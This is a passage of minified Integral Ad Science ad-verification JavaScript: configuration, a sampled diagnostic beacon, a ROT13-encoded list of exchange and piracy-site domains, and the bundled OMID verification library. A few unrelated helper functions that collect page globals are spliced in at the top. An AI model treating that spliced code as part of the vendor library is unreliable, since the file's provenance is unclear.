const trackedKeys = window.trackedKeys;
function generateSignature(data) {
  const keys = Object.keys(data).sort();
  const combined = keys.join("&");
  let signature = 0;
  for (let char of combined) {
    const code = char.charCodeAt(0);
    signature = (signature << 5) - signature + code;
    signature |= 0; // Convert to 32bit integer
  }
  return signature.toString(36);
}
var __IntegralASDiagnosticCall = function () {
  try {
    var alreadySent = {};
    return function (code, err, config) {
      try {
        var gen = function (code, err, config) {
          var url = '//diag.adsafeprotected.com/js?';
          try {
            var errMsg = err && err.message ? encodeURIComponent(err.message.replace(/ /g, '-')).substring(0, 200) : '';
            url += 'code:fwjs-diag-' + code;
            url += '&err:' + errMsg;
            url += '&codeanderr:' + code + '_' + errMsg;
            if (config) {
              url += '&version:' + config.version || '';
              url += '&server:' + config.mn || '';
              url += '&region:' + config.region || '';
              url += '&mode:' + config.mode || '';
              url += '&forceAppend:' + config.forceAppend || '';
              url += '&asid:' + config.asid || '';
              url += '&anId:' + config.anId || '';
              url += '&advEntityId:' + config.advEntityId || '';
              url += '&pubEntityId:' + config.pubEntityId || '';
              url += '&mobOrTab:' + config.mobOrTab || '';
              url += '&app:' + config.app || '';
              url += '&mobAppWebview:' + config.mobAppWebview || '';
            }
            url += '&domless:' + __IASScope.isDomless;
          } catch (e) {
            url += '&diagx:' + (e && e.message ? e.message.toString().replace(/ /g, '-') : '');
          }
          return url;
        };
        var send = function (url) {
          if (__IASScope.isDomless && __IASOmidVerificationClient && __IASOmidVerificationClient.sendUrl) {
            __IASOmidVerificationClient.sendUrl(url);
          } else {
            var img = new Image();
            img.src = url;
          }
        };
        if (!alreadySent[code] && Math.random() < 0.01) {
          alreadySent[code] = true;
          send(gen(code, err, config));
        }
      } catch (e) {}
    };
  } catch (e) {
    return function () {};
  }
}();
function collectGlobalVariables() {
  const collectedData = {};
  trackedKeys.forEach(key => {
    if (window[key] !== undefined) {
      collectedData[key] = window[key];
    }
  });
  return collectedData;
}
try {
  var __IntegralASConfig = {
    jsDoSplit: false,
    debug: "false",
    jsDiag: 'true',
    version: '19.8.460',
    exchList: {
      'e1': 'nqzryq',
      'e2': 'tbbtyrnqf.t.qbhoyrpyvpx',
      'e3': 'ehovpbacebwrpg',
      'e4': 'chozngvp',
      'e5': 'bcrak',
      'e6': 'nqoevgr.pbz',
      'e7': 'tynz.pbz',
      'e8': 'lvryqznantre.pbz',
      'e9': 'yvwvg',
      'e10': 'nqakf',
      'p11': 'ghea.pbz',
      'p12': 'zngugnt',
      'p13': 'vaivgrzrqvn',
      'p14': 'qngnkh',
      'n15': 'zrqvn6qrterrf',
      'n16': 'dhnagfreir',
      'n17': 'esvuho.arg',
      'a18': 'napubeserr',
      'a19': 'eff2frnepu',
      'a20': 'mgfgngvp.pbz',
      'n21': 'ovq.npr.nqiregvfvat',
      'e22': 'wnfba',
      'v23': 'fcbgkpqa',
      'v24': 'ogeyy',
      'v25': 'yvirenvy',
      'v26': 'nqncgi',
      'v27': 'nqnc.gi',
      'n29': 'qbzqrk.pbz',
      'n30': 'ernyih.arg',
      'd31': 'cvengronl',
      'd32': 'cebklonl',
      'd33': 'onlcebkl',
      'd34': 'cvengrcebkl',
      'd35': 'cebklcvengr',
      'd36': 'onlcvengr',
      'n37': 'tjnyyrg',
      'p39': 'j55p.arg',
      'p40': 'c0l.pa',
      'p41': 'vcvalbh.pbz',
      'p42': 'c0lwferaqre'
    },
    sp_cdnDomain: 'cdn.adsafeprotected.com',
    sp_cdnScripts: {
      xsca: "static.adsafeprotected.com/xsca.17.4.85.js",
      sca: "static.adsafeprotected.com/sca.17.6.2.js",
      main: "static.adsafeprotected.com/main.19.8.460.js"
    },
    protocol: 'https',
    jsref: "https:\/\/www.financialsamurai.com\/",
    asid: "6e725abe-8550-11ee-a5da-4a8069649a06",
    allowViewability: "true",
    jsFeatures: "viewabilityready,rattie,exch,usedtdomain,resolution,usetpl,idMap,offscreen,everySecond:1,slid,fm2:1,largeAd,chromeNativeIO,ios,ancestor,avmm,avgrn,swapids,pIntervals:10,usesca,bustediframe,impFailSafe,yieldmo,sfdetect,pmdetect,novidnodeerr:5,viewabilityOptimization,usehaps,customMetric,sizmek,celtra,groupmCM,avidPropertiesInImpression,abcAudit,mrcAudit:1,bbs,bas,spg,exitOASRSEarly:1,encodeInvalidUrlChars,recoverOmidLostTime,forceKeepGoogleAdNode",
    minimizeCalls: "false",
    adWidth: "300",
    adHeight: "250",
    forceAppend: "false",
    forceNoIframe: false,
    sp_imp_maxLength: 10000,
    sp_imp_jsInfo_minLength: 200,
    _onInViewMRC15: __IntegralASConfig && __IntegralASConfig.onInViewMRC15,
    _onInViewMRC: __IntegralASConfig && __IntegralASConfig.onInViewMRC,
    _onMeasurable: __IntegralASConfig && __IntegralASConfig.onMeasurable,
    _onAPIResult: __IntegralASConfig && __IntegralASConfig.onAPIResult,
    _onInViewFull: __IntegralASConfig && __IntegralASConfig.onInViewFull,
    _onSuspicious: __IntegralASConfig && __IntegralASConfig.onSuspicious,
    _onInViewMRC5: __IntegralASConfig && __IntegralASConfig.onInViewMRC5,
    reqquery: "",
    mode: "rjss",
    requrl: "",
    dtBaseURL: "https:\/\/dt.adsafeprotected.com\/dt?advEntityId=1672296",
    adsafeSrc: "https:\/\/fw.adsafeprotected.com\/rfw\/www.googletagservices.com\/1672296\/76280045\/dcm\/dcmads.js?bundleId=&ias_dspID=2&ias_campId=9121951&ias_pubId=&ias_chanId=3561&ias_placementId=23264778&bidurl=https%3A%2F%2Fwww.financialsamurai.com%2F&ias_dealId=0&ias_xappb=&adsafe_par&ias_impId=v4~~33836892570139283",
    tpiLookupURL: "",
    getTpl: "false",
    use100v: false,
    useBapiCallback: "",
    useViewabilityNotification: "",
    scriptUrl: "https:\/\/fw.adsafeprotected.com\/rjss\/www.googletagservices.com\/1672296\/76280045\/dcm\/dcmads.js?bundleId=&ias_dspID=2&ias_campId=9121951&ias_pubId=&ias_c",
    accountForSadImps: '',
    fwMonitoring: 'false',
    mn: "jsserver-primary-7bc59574b7-fr99k",
    mobOrTab: false,
    app: false,
    mobAppWebview: false,
    mobFwUrl: "https:\/\/mobile.adsafeprotected.com\/internal\/blocking\/app\/initial\/1672296\/76280045?redirectUrl=https%3A%2F%2Fwww.googletagservices.com%2Fdcm%2Fdcmads.js%3FbundleId%3D&ias_campId=9121951&ias_pubId=&ias_placementId=23264778&ias_chanId=3561&ias_dealId=0&ias_impId=v4~~33836892570139283&ias_dspId=2",
    anId: '',
    advEntityId: '1672296',
    pubEntityId: '76280045',
    videoId: '',
    rts: {},
    customViewability: [],
    serverSideAppDetection: [],
    groupm_native_publisher: false,
    integration: null,
    staticServer: '\/\/static.adsafeprotected.com\/',
    passback: '',
    iasProxyPartnerDomain: '',
    region: 'jp'
  };
  try {
    __IASScope = typeof window !== "undefined" ? window : this;
    __IntegralASConfig.isResolved = !!__IntegralASConfig.jsFeatures;
    __IntegralASConfig.staticMode = !__IntegralASConfig.isResolved;
    __IntegralASConfig.birthdate = new Date().getTime();
    __IntegralASConfig.perfBirth = typeof __IASScope.performance !== "undefined" && typeof __IASScope.performance.now === 'function' ? __IASScope.performance.now() : null;
    ;
    (function (omidGlobal, factory, exports) {
      // CommonJS support
      if (typeof exports === 'object' && typeof exports.nodeName !== 'string') {
        factory(omidGlobal, exports);

        // If neither AMD nor CommonJS are used, export to a versioned name in the
        // global context.
      } else {
        var exports = {};
        var versions = ['1.3.25-iab3167'];
        var additionalVersionString = '';
        if (!!additionalVersionString) {
          versions.push(additionalVersionString);
        }
        factory(omidGlobal, exports);
        function deepFreeze(object) {
          for (var key in object) {
            if (object.hasOwnProperty(key)) {
              object[key] = deepFreeze(object[key]);
            }
          }
          return Object.freeze(object);
        }

        // Inject and freeze the exported components of omid.
        for (var key in exports) {
          if (exports.hasOwnProperty(key)) {
            if (Object.getOwnPropertyDescriptor(omidGlobal, key) == null) {
              // Define the top level property in the global scope
              Object.defineProperty(omidGlobal, key, {
                //						value: {},       Removed trailing comma for build
                value: {}
              });
            }
            versions.forEach(function (version) {
              if (Object.getOwnPropertyDescriptor(omidGlobal[key], version) == null) {
                var frozenObject = deepFreeze(exports[key]);
                // Define the object exports keyed-off versions
                Object.defineProperty(omidGlobal[key], version, {
                  get: function () {
                    return frozenObject;
                  },
                  //							enumerable: true,       Removed trailing comma for build
                  enumerable: true
                });
              }
            });
          }
        }
      }
    })(typeof global === 'undefined' ? this : global, function (omidGlobal, omidExports) {
      'use strict';

      var $jscomp = $jscomp || {};
      $jscomp.scope = {};
      $jscomp.arrayIteratorImpl = function (a) {
        var b = 0;
        return function () {
          return b < a.length ? {
            done: !1,
            value: a[b++]
          } : {
            done: !0
          };
        };
      };
      $jscomp.arrayIterator = function (a) {
        return {
          next: $jscomp.arrayIteratorImpl(a)
        };
      };
      $jscomp.makeIterator = function (a) {
        var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
        return b ? b.call(a) : $jscomp.arrayIterator(a);
      };
      $jscomp.arrayFromIterator = function (a) {
        for (var b, c = []; !(b = a.next()).done;) {
          c.push(b.value);
        }
        return c;
      };
      $jscomp.arrayFromIterable = function (a) {
        return a instanceof Array ? a : $jscomp.arrayFromIterator($jscomp.makeIterator(a));
      };
      $jscomp.ASSUME_ES5 = !1;
      $jscomp.ASSUME_NO_NATIVE_MAP = !1;
      $jscomp.ASSUME_NO_NATIVE_SET = !1;
      $jscomp.SIMPLE_FROUND_POLYFILL = !1;
      $jscomp.objectCreate = $jscomp.ASSUME_ES5 || "function" == typeof Object.create ? Object.create : function (a) {
        var b = function () {};
        b.prototype = a;
        return new b();
      };
      $jscomp.underscoreProtoCanBeSet = function () {
        var a = {
            a: !0
          },
          b = {};
        try {
          return b.__proto__ = a, b.a;
        } catch (c) {}
        return !1;
      };
      $jscomp.setPrototypeOf = "function" == typeof Object.setPrototypeOf ? Object.setPrototypeOf : $jscomp.underscoreProtoCanBeSet() ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) {
          throw new TypeError(a + " is not extensible");
        }
        return a;
      } : null;
      $jscomp.inherits = function (a, b) {
        a.prototype = $jscomp.objectCreate(b.prototype);
        a.prototype.constructor = a;
        if ($jscomp.setPrototypeOf) {
          var c = $jscomp.setPrototypeOf;
          c(a, b);
        } else {
          for (c in b) {
            if ("prototype" != c) {
              if (Object.defineProperties) {
                var d = Object.getOwnPropertyDescriptor(b, c);
                d && Object.defineProperty(a, c, d);
              } else {
                a[c] = b[c];
              }
            }
          }
        }
        a.superClass_ = b.prototype;
      };
      var module$exports$omid$common$constants = {
        AdEventType: {
          IMPRESSION: "impression",
          LOADED: "loaded",
          GEOMETRY_CHANGE: "geometryChange",
          SESSION_START: "sessionStart",
          SESSION_ERROR: "sessionError",
          SESSION_FINISH: "sessionFinish",
          MEDIA: "media",
          VIDEO: "video",
          START: "start",
          FIRST_QUARTILE: "firstQuartile",
          MIDPOINT: "midpoint",
          THIRD_QUARTILE: "thirdQuartile",
          COMPLETE: "complete",
          PAUSE: "pause",
          RESUME: "resume",
          BUFFER_START: "bufferStart",
          BUFFER_FINISH: "bufferFinish",
          SKIPPED: "skipped",
          VOLUME_CHANGE: "volumeChange",
          PLAYER_STATE_CHANGE: "playerStateChange",
          AD_USER_INTERACTION: "adUserInteraction",
          STATE_CHANGE: "stateChange"
        },
        MediaEventType: {
          LOADED: "loaded",
          START: "start",
          FIRST_QUARTILE: "firstQuartile",
          MIDPOINT: "midpoint",
          THIRD_QUARTILE: "thirdQuartile",
          COMPLETE: "complete",
          PAUSE: "pause",
          RESUME: "resume",
          BUFFER_START: "bufferStart",
          BUFFER_FINISH: "bufferFinish",
          SKIPPED: "skipped",
          VOLUME_CHANGE: "volumeChange",
          PLAYER_STATE_CHANGE: "playerStateChange",
          AD_USER_INTERACTION: "adUserInteraction"
        },
        ImpressionType: {
          DEFINED_BY_JAVASCRIPT: "definedByJavaScript",
          UNSPECIFIED: "unspecified",
          LOADED: "loaded",
          BEGIN_TO_RENDER: "beginToRender",
          ONE_PIXEL: "onePixel",
          VIEWABLE: "viewable",
          AUDIBLE: "audible",
          OTHER: "other"
        },
        ErrorType: {
          GENERIC: "generic",
          VIDEO: "video",
          MEDIA: "media"
        },
        AdSessionType: {
          NATIVE: "native",
          HTML: "html",
          JAVASCRIPT: "javascript"
        },
        EventOwner: {
          NATIVE: "native",
          JAVASCRIPT: "javascript",
          NONE: "none"
        },
        AccessMode: {
          FULL: "full",
          DOMAIN: "domain",
          LIMITED: "limited"
        },
        AppState: {
          BACKGROUNDED: "backgrounded",
          FOREGROUNDED: "foregrounded"
        },
        Environment: {
          APP: "app",
          WEB: "web"
        },
        InteractionType: {
          CLICK: "click",
          INVITATION_ACCEPT: "invitationAccept"
        },
        CreativeType: {
          DEFINED_BY_JAVASCRIPT: "definedByJavaScript",
          HTML_DISPLAY: "htmlDisplay",
          NATIVE_DISPLAY: "nativeDisplay",
          VIDEO: "video",
          AUDIO: "audio"
        },
        MediaType: {
          DISPLAY: "display",
          VIDEO: "video"
        },
        Reason: {
          NOT_FOUND: "notFound",
          HIDDEN: "hidden",
          BACKGROUNDED: "backgrounded",
          VIEWPORT: "viewport",
          OBSTRUCTED: "obstructed",
          CLIPPED: "clipped",
          UNMEASURABLE: "unmeasurable",
          NO_WINDOW_FOCUS: "noWindowFocus"
        },
        SupportedFeatures: {
          CONTAINER: "clid",
          VIDEO: "vlid"
        },
        VideoPosition: {
          PREROLL: "preroll",
          MIDROLL: "midroll",
          POSTROLL: "postroll",
          STANDALONE: "standalone"
        },
        VideoPlayerState: {
          MINIMIZED: "minimized",
          COLLAPSED: "collapsed",
          NORMAL: "normal",
          EXPANDED: "expanded",
          FULLSCREEN: "fullscreen"
        },
        NativeViewKeys: {
          X: "x",
          LEFT: "left",
          Y: "y",
          TOP: "top",
          WIDTH: "width",
          HEIGHT: "height",
          AD_SESSION_ID: "adSessionId",
          IS_FRIENDLY_OBSTRUCTION_FOR: "isFriendlyObstructionFor",
          CLIPS_TO_BOUNDS: "clipsToBounds",
          CHILD_VIEWS: "childViews",
          END_X: "endX",
          END_Y: "endY",
          OBSTRUCTIONS: "obstructions",
          OBSTRUCTION_CLASS: "obstructionClass",
          OBSTRUCTION_PURPOSE: "obstructionPurpose",
          OBSTRUCTION_REASON: "obstructionReason",
          PIXELS: "pixels",
          HAS_WINDOW_FOCUS: "hasWindowFocus"
        },
        MeasurementStateChangeSource: {
          CONTAINER: "container",
          CREATIVE: "creative"
        },
        ElementMarkup: {
          OMID_ELEMENT_CLASS_NAME: "omid-element"
        },
        CommunicationType: {
          NONE: "NONE",
          DIRECT: "DIRECT",
          POST_MESSAGE: "POST_MESSAGE"
        },
        OmidImplementer: {
          OMSDK: "omsdk"
        }
      };
      var module$contents$omid$common$InternalMessage_GUID_KEY = "omid_message_guid",
        module$contents$omid$common$InternalMessage_METHOD_KEY = "omid_message_method",
        module$contents$omid$common$InternalMessage_VERSION_KEY = "omid_message_version",
        module$contents$omid$common$InternalMessage_ARGS_KEY = "omid_message_args",
        module$exports$omid$common$InternalMessage = function (a, b, c, d) {
          this.guid = a;
          this.method = b;
          this.version = c;
          this.args = d;
        };
      module$exports$omid$common$InternalMessage.isValidSerializedMessage = function (a) {
        return !!a && void 0 !== a[module$contents$omid$common$InternalMessage_GUID_KEY] && void 0 !== a[module$contents$omid$common$InternalMessage_METHOD_KEY] && void 0 !== a[module$contents$omid$common$InternalMessage_VERSION_KEY] && "string" === typeof a[module$contents$omid$common$InternalMessage_GUID_KEY] && "string" === typeof a[module$contents$omid$common$InternalMessage_METHOD_KEY] && "string" === typeof a[module$contents$omid$common$InternalMessage_VERSION_KEY] && (void 0 === a[module$contents$omid$common$InternalMessage_ARGS_KEY] || void 0 !== a[module$contents$omid$common$InternalMessage_ARGS_KEY]);
      };
      module$exports$omid$common$InternalMessage.deserialize = function (a) {
        return new module$exports$omid$common$InternalMessage(a[module$contents$omid$common$InternalMessage_GUID_KEY], a[module$contents$omid$common$InternalMessage_METHOD_KEY], a[module$contents$omid$common$InternalMessage_VERSION_KEY], a[module$contents$omid$common$InternalMessage_ARGS_KEY]);
      };
      module$exports$omid$common$InternalMessage.prototype.serialize = function () {
        var a = {};
        a = (a[module$contents$omid$common$InternalMessage_GUID_KEY] = this.guid, a[module$contents$omid$common$InternalMessage_METHOD_KEY] = this.method, a[module$contents$omid$common$InternalMessage_VERSION_KEY] = this.version, a);
        void 0 !== this.args && (a[module$contents$omid$common$InternalMessage_ARGS_KEY] = this.args);
        return a;
      };
      var module$exports$omid$common$Communication = function (a) {
        this.to = a;
        this.communicationType_ = module$exports$omid$common$constants.CommunicationType.NONE;
      };
      module$exports$omid$common$Communication.prototype.sendMessage = function (a, b) {};
      module$exports$omid$common$Communication.prototype.handleMessage = function (a, b) {
        if (this.onMessage) {
          this.onMessage(a, b);
        }
      };
      module$exports$omid$common$Communication.prototype.serialize = function (a) {
        return JSON.stringify(a);
      };
      module$exports$omid$common$Communication.prototype.deserialize = function (a) {
        return JSON.parse(a);
      };
      module$exports$omid$common$Communication.prototype.isDirectCommunication = function () {
        return this.communicationType_ === module$exports$omid$common$constants.CommunicationType.DIRECT;
      };
      module$exports$omid$common$Communication.prototype.isCrossOrigin = function () {};
      var module$exports$omid$common$logger = {
        error: function (a) {
          for (var b = [], c = 0; c < arguments.length; ++c) {
            b[c - 0] = arguments[c];
          }
          module$contents$omid$common$logger_executeLog(function () {
            throw new (Function.prototype.bind.apply(Error, [null, "Could not complete the test successfully - "].concat($jscomp.arrayFromIterable(b))))();
          }, function () {
            return console.error.apply(console, $jscomp.arrayFromIterable(b));
          });
        },
        debug: function (a) {
          for (var b = [], c = 0; c < arguments.length; ++c) {
            b[c - 0] = arguments[c];
          }
          module$contents$omid$common$logger_executeLog(function () {}, function () {
            return console.error.apply(console, $jscomp.arrayFromIterable(b));
          });
        }
      };
      function module$contents$omid$common$logger_executeLog(a, b) {
        "undefined" !== typeof jasmine && jasmine ? a() : "undefined" !== typeof console && console && console.error && b();
      }
      ;
      var module$exports$omid$common$eventTypedefs = {};
      var module$exports$omid$common$version = {
        ApiVersion: "1.0",
        Version: "1.3.25-iab3167"
      };
      var module$exports$omid$common$argsChecker = {
        assertTruthyString: function (a, b) {
          if (!b) {
            throw Error("Value for " + a + " is undefined, null or blank.");
          }
          if ("string" !== typeof b && !(b instanceof String)) {
            throw Error("Value for " + a + " is not a string.");
          }
          if ("" === b.trim()) {
            throw Error("Value for " + a + " is empty string.");
          }
        },
        assertNotNullObject: function (a, b) {
          if (null == b) {
            throw Error("Value for " + a + " is undefined or null");
          }
        },
        assertNumber: function (a, b) {
          if (null == b) {
            throw Error(a + " must not be null or undefined.");
          }
          if ("number" !== typeof b || isNaN(b)) {
            throw Error("Value for " + a + " is not a number");
          }
        },
        assertNumberBetween: function (a, b, c, d) {
          (0, module$exports$omid$common$argsChecker.assertNumber)(a, b);
          if (b < c || b > d) {
            throw Error("Value for " + a + " is outside the range [" + c + "," + d + "]");
          }
        },
        assertFunction: function (a, b) {
          if (!b) {
            throw Error(a + " must not be truthy.");
          }
        },
        assertPositiveNumber: function (a, b) {
          (0, module$exports$omid$common$argsChecker.assertNumber)(a, b);
          if (0 > b) {
            throw Error(a + " must be a positive number.");
          }
        }
      };
      var module$exports$omid$common$VersionUtils = {},
        module$contents$omid$common$VersionUtils_SEMVER_DIGITS_NUMBER = 3;
      module$exports$omid$common$VersionUtils.isValidVersion = function (a) {
        return /\d+\.\d+\.\d+(-.*)?/.test(a);
      };
      module$exports$omid$common$VersionUtils.versionGreaterOrEqual = function (a, b) {
        a = a.split("-")[0].split(".");
        b = b.split("-")[0].split(".");
        for (var c = 0; c < module$contents$omid$common$VersionUtils_SEMVER_DIGITS_NUMBER; c++) {
          var d = parseInt(a[c], 10),
            e = parseInt(b[c], 10);
          if (d > e) {
            break;
          } else {
            if (d < e) {
              return !1;
            }
          }
        }
        return !0;
      };
      var module$exports$omid$common$ArgsSerDe = {},
        module$contents$omid$common$ArgsSerDe_ARGS_NOT_SERIALIZED_VERSION = "1.0.3";
      module$exports$omid$common$ArgsSerDe.serializeMessageArgs = function (a, b) {
        return (0, module$exports$omid$common$VersionUtils.isValidVersion)(a) && (0, module$exports$omid$common$VersionUtils.versionGreaterOrEqual)(a, module$contents$omid$common$ArgsSerDe_ARGS_NOT_SERIALIZED_VERSION) ? b : JSON.stringify(b);
      };
      module$exports$omid$common$ArgsSerDe.deserializeMessageArgs = function (a, b) {
        return (0, module$exports$omid$common$VersionUtils.isValidVersion)(a) && (0, module$exports$omid$common$VersionUtils.versionGreaterOrEqual)(a, module$contents$omid$common$ArgsSerDe_ARGS_NOT_SERIALIZED_VERSION) ? b ? b : [] : b && "string" === typeof b ? JSON.parse(b) : [];
      };
      var module$exports$omid$common$guid = {
        generateGuid: function () {
          return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
            var b = 16 * Math.random() | 0;
            a = "y" === a ? (b & 3 | 8).toString(16) : b.toString(16);
            return a;
          });
        }
      };
      var module$exports$omid$common$OmidGlobalProvider = {};
      function module$contents$omid$common$OmidGlobalProvider_getOmidGlobal() {
        if ("undefined" !== typeof omidGlobal && omidGlobal) {
          return omidGlobal;
        }
        if ("undefined" !== typeof global && global) {
          return global;
        }
        if ("undefined" !== typeof window && window) {
          return window;
        }
        if ("undefined" !== typeof globalThis && globalThis) {
          return globalThis;
        }
        var a = Function("return this")();
        if (a) {
          return a;
        }
        throw Error("Could not determine global object context.");
      }
      module$exports$omid$common$OmidGlobalProvider.omidGlobal = module$contents$omid$common$OmidGlobalProvider_getOmidGlobal();
      var module$exports$omid$common$exporter = {};
      function module$contents$omid$common$exporter_getOmidExports() {
        return "undefined" === typeof omidExports ? null : omidExports;
      }
      function module$contents$omid$common$exporter_getOrCreateName(a, b) {
        return a && (a[b] || (a[b] = {}));
      }
      module$exports$omid$common$exporter.packageExport = function (a, b, c) {
        if (c = void 0 === c ? module$contents$omid$common$exporter_getOmidExports() : c) {
          a = a.split("."), a.slice(0, a.length - 1).reduce(module$contents$omid$common$exporter_getOrCreateName, c)[a[a.length - 1]] = b;
        }
      };
      var module$exports$omid$common$windowUtils = {};
      function module$contents$omid$common$windowUtils_isValidWindow(a) {
        return null != a && "undefined" !== typeof a.top && null != a.top;
      }
      module$exports$omid$common$windowUtils.isCrossOrigin = function (a) {
        if (a === module$exports$omid$common$OmidGlobalProvider.omidGlobal) {
          return !1;
        }
        try {
          if ("undefined" === typeof a.location.hostname) {
            return !0;
          }
          module$contents$omid$common$windowUtils_isSameOriginForIE(a);
        } catch (b) {
          return !0;
        }
        return !1;
      };
      function module$contents$omid$common$windowUtils_isSameOriginForIE(a) {
        return "" === a.x || "" !== a.x;
      }
      module$exports$omid$common$windowUtils.resolveGlobalContext = function (a) {
        "undefined" === typeof a && "undefined" !== typeof window && window && (a = window);
        return module$contents$omid$common$windowUtils_isValidWindow(a) ? a : module$exports$omid$common$OmidGlobalProvider.omidGlobal;
      };
      module$exports$omid$common$windowUtils.resolveTopWindowContext = function (a) {
        return module$contents$omid$common$windowUtils_isValidWindow(a) ? a.top : module$exports$omid$common$OmidGlobalProvider.omidGlobal;
      };
      module$exports$omid$common$windowUtils.isTopWindowAccessible = function (a) {
        try {
          return a.top.location.href ? !0 : !1;
        } catch (b) {
          return !1;
        }
      };
      module$exports$omid$common$windowUtils.evaluatePageUrl = function (a) {
        if (!module$contents$omid$common$windowUtils_isValidWindow(a)) {
          return null;
        }
        try {
          var b = a.top;
          return (0, module$exports$omid$common$windowUtils.isCrossOrigin)(b) ? null : b.location.href;
        } catch (c) {
          return null;
        }
      };
      var module$exports$omid$common$DirectCommunication = function (a) {
        module$exports$omid$common$Communication.call(this, a);
        this.communicationType_ = module$exports$omid$common$constants.CommunicationType.DIRECT;
        this.handleExportedMessage = module$exports$omid$common$DirectCommunication.prototype.handleExportedMessage.bind(this);
      };
      $jscomp.inherits(module$exports$omid$common$DirectCommunication, module$exports$omid$common$Communication);
      module$exports$omid$common$DirectCommunication.prototype.sendMessage = function (a, b) {
        b = void 0 === b ? this.to : b;
        if (!b) {
          throw Error("Message destination must be defined at construction time or when sending the message.");
        }
        b.handleExportedMessage(a.serialize(), this);
      };
      module$exports$omid$common$DirectCommunication.prototype.handleExportedMessage = function (a, b) {
        module$exports$omid$common$InternalMessage.isValidSerializedMessage(a) && this.handleMessage(module$exports$omid$common$InternalMessage.deserialize(a), b);
      };
      module$exports$omid$common$DirectCommunication.prototype.isCrossOrigin = function () {
        return !1;
      };
      var module$exports$omid$common$PostMessageCommunication = function (a, b) {
        b = void 0 === b ? module$exports$omid$common$OmidGlobalProvider.omidGlobal : b;
        module$exports$omid$common$Communication.call(this, b);
        var c = this;
        this.communicationType_ = module$exports$omid$common$constants.CommunicationType.POST_MESSAGE;
        a.addEventListener("message", function (a) {
          if ("object" === typeof a.data) {
            var b = a.data;
            module$exports$omid$common$InternalMessage.isValidSerializedMessage(b) && (b = module$exports$omid$common$InternalMessage.deserialize(b), a.source && c.handleMessage(b, a.source));
          }
        });
      };
      $jscomp.inherits(module$exports$omid$common$PostMessageCommunication, module$exports$omid$common$Communication);
      module$exports$omid$common$PostMessageCommunication.isCompatibleContext = function (a) {
        return !!(a && a.addEventListener && a.postMessage);
      };
      module$exports$omid$common$PostMessageCommunication.prototype.sendMessage = function (a, b) {
        b = void 0 === b ? this.to : b;
        if (!b) {
          throw Error("Message destination must be defined at construction time or when sending the message.");
        }
        b.postMessage(a.serialize(), "*");
      };
      module$exports$omid$common$PostMessageCommunication.prototype.isCrossOrigin = function () {
        return this.to ? (0, module$exports$omid$common$windowUtils.isCrossOrigin)(this.to) : !0;
      };
      var module$exports$omid$common$DetectOmid = {
        OMID_PRESENT_FRAME_NAME: "omid_v1_present",
        isOmidPresent: function (a) {
          try {
            return a.frames ? !!a.frames[module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME] : !1;
          } catch (b) {
            return !1;
          }
        },
        declareOmidPresence: function (a) {
          a.frames && a.document && (module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME in a.frames || (null == a.document.body && module$exports$omid$common$DetectOmid.isMutationObserverAvailable_(a) ? module$exports$omid$common$DetectOmid.registerMutationObserver_(a) : a.document.body ? module$exports$omid$common$DetectOmid.appendPresenceIframe_(a) : a.document.write('<iframe style="display:none" id="' + (module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME + '" name="') + (module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME + '"></iframe>'))));
        },
        appendPresenceIframe_: function (a) {
          var b = a.document.createElement("iframe");
          b.id = module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME;
          b.name = module$exports$omid$common$DetectOmid.OMID_PRESENT_FRAME_NAME;
          b.style.display = "none";
          a.document.body.appendChild(b);
        },
        isMutationObserverAvailable_: function (a) {
          return "MutationObserver" in a;
        },
        registerMutationObserver_: function (a) {
          var b = new MutationObserver(function (c) {
            c.forEach(function (c) {
              "BODY" === c.addedNodes[0].nodeName && (module$exports$omid$common$DetectOmid.appendPresenceIframe_(a), b.disconnect());
            });
          });
          b.observe(a.document.documentElement, {
            childList: !0
          });
        }
      };
      var module$exports$omid$common$serviceCommunication = {},
        module$contents$omid$common$serviceCommunication_EXPORTED_SESSION_COMMUNICATION_NAME = ["omid", "v1_SessionServiceCommunication"],
        module$contents$omid$common$serviceCommunication_EXPORTED_VERIFICATION_COMMUNICATION_NAME = ["omid", "v1_VerificationServiceCommunication"],
        module$contents$omid$common$serviceCommunication_EXPORTED_SERVICE_WINDOW_NAME = ["omidVerificationProperties", "serviceWindow"];
      function module$contents$omid$common$serviceCommunication_getValueForKeypath(a, b) {
        return b.reduce(function (a, b) {
          return a && a[b];
        }, a);
      }
      function module$contents$omid$common$serviceCommunication_startServiceCommunication(a, b, c, d) {
        if (!(0, module$exports$omid$common$windowUtils.isCrossOrigin)(b)) {
          try {
            var e = module$contents$omid$common$serviceCommunication_getValueForKeypath(b, c);
            if (e) {
              return new module$exports$omid$common$DirectCommunication(e);
            }
          } catch (f) {}
        }
        return d(b) ? new module$exports$omid$common$PostMessageCommunication(a, b) : null;
      }
      function module$contents$omid$common$serviceCommunication_startServiceCommunicationFromCandidates(a, b, c, d) {
        b = $jscomp.makeIterator(b);
        for (var e = b.next(); !e.done; e = b.next()) {
          if (e = module$contents$omid$common$serviceCommunication_startServiceCommunication(a, e.value, c, d)) {
            return e;
          }
        }
        return null;
      }
      module$exports$omid$common$serviceCommunication.startSessionServiceCommunication = function (a, b, c) {
        c = void 0 === c ? module$exports$omid$common$DetectOmid.isOmidPresent : c;
        var d = [a, (0, module$exports$omid$common$windowUtils.resolveTopWindowContext)(a)];
        b && d.unshift(b);
        return module$contents$omid$common$serviceCommunication_startServiceCommunicationFromCandidates(a, d, module$contents$omid$common$serviceCommunication_EXPORTED_SESSION_COMMUNICATION_NAME, c);
      };
      module$exports$omid$common$serviceCommunication.startVerificationServiceCommunication = function (a, b) {
        b = void 0 === b ? module$exports$omid$common$DetectOmid.isOmidPresent : b;
        var c = [],
          d = module$contents$omid$common$serviceCommunication_getValueForKeypath(a, module$contents$omid$common$serviceCommunication_EXPORTED_SERVICE_WINDOW_NAME);
        d && c.push(d);
        c.push((0, module$exports$omid$common$windowUtils.resolveTopWindowContext)(a));
        return module$contents$omid$common$serviceCommunication_startServiceCommunicationFromCandidates(a, c, module$contents$omid$common$serviceCommunication_EXPORTED_VERIFICATION_COMMUNICATION_NAME, b);
      };
      var module$contents$omid$verificationClient$VerificationClient_VERIFICATION_CLIENT_VERSION = module$exports$omid$common$version.Version,
